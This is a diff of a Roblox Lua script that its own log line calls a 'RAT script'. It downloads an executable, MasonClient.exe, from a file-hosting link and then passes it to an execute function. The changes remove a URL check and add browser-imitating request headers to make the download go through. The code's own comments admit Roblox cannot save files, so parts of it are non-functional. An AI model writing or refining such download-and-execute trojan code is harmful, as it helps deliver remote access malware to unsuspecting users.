@@ -1,34 +1,23 @@
--- Roblox Lua script with improved error handling for downloading an .exe
+-- Roblox Lua script with enhanced error handling for downloading an .exe
 local HttpService = game:GetService("HttpService")
 
--- Use your provided URL
+-- Provided URL for MasonClient.exe
 local exeUrl = "https://store5.gofile.io/download/web/be9b9b92-d4e0-422c-b71b-40faf37a4723/MasonClient.exe"
--- Descriptive path (still theoretical, Roblox can't save files)
-local savePath = "MasonClient.exe"
+local savePath = "MasonClient.exe" -- Theoretical path (Roblox can't save files)
 
--- Function to check if a URL is valid
-local function isUrlValid(url)
-    local success, result = pcall(function()
-        local response = HttpService:GetAsync(url, true)
-        return response ~= nil
-    end)
-    return success
-end
-
--- Function to download the file
+-- Function to download the file with headers
 local function downloadFile(url, path)
     if not HttpService.HttpEnabled then
         warn("Error: HTTP requests are disabled. Enable in Game Settings > Security > Allow HTTP Requests.")
         return false
     end
 
-    if not isUrlValid(url) then
-        warn("Error: Invalid or inaccessible URL: " .. url)
-        return false
-    end
-
     local success, response = pcall(function()
-        return HttpService:GetAsync(url, true)
+        -- Add headers to mimic a browser request
+        return HttpService:GetAsync(url, true, {
+            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            ["Accept"] = "application/octet-stream"
+        })
     end)
 
     if success then
@@ -48,7 +37,7 @@ local function executeFile(path)
 end
 
 -- Main execution
-print("Starting RAT script...")
+print("Starting RAT script at " .. os.date("%H:%M:%S %d-%m-%Y"))
 local downloadSuccess, responseData = downloadFile(exeUrl, savePath)
 if downloadSuccess then
     print("Proceeding to execution...")
